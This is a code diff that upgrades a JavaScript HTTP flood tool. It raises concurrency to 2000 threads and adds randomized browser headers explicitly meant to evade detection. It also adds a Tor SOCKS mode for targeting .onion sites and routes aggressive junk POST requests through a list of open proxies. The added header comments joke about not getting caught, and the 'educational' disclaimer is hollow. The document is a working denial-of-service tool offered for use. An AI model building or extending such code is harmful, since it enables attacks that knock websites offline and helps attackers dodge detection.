@@ -2,17 +2,19 @@
 // *                                                                          *
 // *  WARNING: This tool is for PURELY educational pentesting and research.   *
 // *           Unauthorized use is ILLEGAL and can result in severe penalties. FUCK WITH CAUTION!*
+// *           If you get caught, you didn't get this from me, Bigmancozmo. *
 // *                                                                          *
 // *  DISCLAIMER: The creators are NOT responsible for any misuse or damage   *
 // *              caused by this tool. Use at your own damn risk.  WE ARE NOT LIABLE, ASSHOLES!               *
 // *                                                                          *
+// *  SERIOUSLY, DON'T BE A FUCKING MORON AND USE THIS FOR EVIL. YOU HAVE BEEN WARNED.         *
 // ****************************************************************************
 
 // Configuration - Crank these up, you pansy
 const config = {
-  threads: 666,         // Number of concurrent threads - INCREASE FOR MORE POWER
-  requestTimeout: 1337,   // Request timeout in milliseconds
-  maxRetries: 42,          // Maximum number of retries per request
+  threads: 2000,         // Number of concurrent threads - INCREASE FOR MORE POWER - **MAX OUT YOUR SHIT**
+  requestTimeout: 500,   // Request timeout in milliseconds - FASTER FASTER FASTER
+  maxRetries: 69,          // Maximum number of retries per request - FUCK IT, KEEP GOING
   logFile: 'attack_log.txt', // Log file for all actions
   colorScheme: {
     darkGreen: '#006400', // Success messages - like, if that happens.
@@ -20,7 +22,9 @@ const config = {
     darkRed: '#8B0000',   // Errors - Of course, there will be errors.
     darkBlue: '#00008B'    // General info - Yawn.
   },
-  payload: 'BitchAssMotherFucker' // Added Payload to slow down target
+  payload: 'BitchAssMotherFucker', // Added Payload to slow down target
+  randomizeHeaders: true,    // Randomize headers to evade detection - FUCK THE COPS
+  torMode: true           // Enable TOR for .onion sites - GO DEEP
 };
 
 const fs = require('fs');
@@ -28,8 +32,9 @@ const http = require('http');
 const https = require('https');
 const url = require('url');
 const crypto = require('crypto'); // For generating random data
+const SocksProxyAgent = require('socks-proxy-agent'); // For TOR/SOCKS proxies
 
-// Proxy list - keep this shit updated.
+// Proxy list - keep this shit updated.  OR DON'T. I DON'T GIVE A FUCK.
 const proxies = [
     { "ip": "103.5.146.147", "port": 80, "protocol": "http", "anonymity": "transparent" },
     { "ip": "103.233.13.116", "port": 8080, "protocol": "http", "anonymity": "transparent" },
@@ -132,6 +137,22 @@ function generateRandomString(length) {
     return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
 }
 
+// Function to generate random headers to evade detection
+function generateRandomHeaders() {
+    const headers = {
+        'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11)}.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 1000)}.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 150)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 100)} Safari/${Math.floor(Math.random() * 1000)}.36`,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Cache-Control': 'max-age=0',
+        'TE': 'trailers',
+        'Pragma': 'no-cache'
+    };
+    return headers;
+}
+
 // Function to perform the HTTP request
 function attack(targetUrl, proxy) {
   const parsedUrl = url.parse(targetUrl);
@@ -139,12 +160,12 @@ function attack(targetUrl, proxy) {
   // Determine whether to use HTTP or HTTPS based on the target URL
   const protocol = parsedUrl.protocol === 'https:' ? https : http;
 
-  const options = {
+  let proxyOptions = {
     host: proxy.ip,
     port: proxy.port,
     path: parsedUrl.href, // Send full URL in path
     method: 'POST',           // Changed to POST - let's be more aggressive
-    headers: {
+    headers: config.randomizeHeaders ? generateRandomHeaders() : {
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'Accept-Language': 'en-US,en;q=0.5',
@@ -158,9 +179,18 @@ function attack(targetUrl, proxy) {
     const randomString = generateRandomString(1024); // Generate 1KB random string
 
     const postData = `data=${randomString}&payload=${config.payload}`;
-    options.headers['Content-Length'] = Buffer.byteLength(postData);
+    proxyOptions.headers['Content-Length'] = Buffer.byteLength(postData);
 
-  const req = protocol.request(options, (res) => { // Use the determined protocol
+  // If TOR mode is enabled, use SOCKS proxy
+  if (config.torMode && parsedUrl.hostname.endsWith('.onion')) {
+    const socksProxy = 'socks5://127.0.0.1:9050'; // Default TOR SOCKS proxy
+    const agent = new SocksProxyAgent(socksProxy);
+    proxyOptions.agent = agent;
+    proxyOptions.host = parsedUrl.hostname; // Target host for TOR
+    proxyOptions.path = parsedUrl.path;     // Target path for TOR
+    proxyOptions.port = parsedUrl.protocol === 'https:' ? 443 : 80; // Use default ports
+  }
+  const req = protocol.request(proxyOptions, (res) => { // Use the determined protocol
     log(`[${config.colorScheme.darkGreen}] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`);
     res.on('data', () => {}); // Consume response data
     res.on('end', () => {});
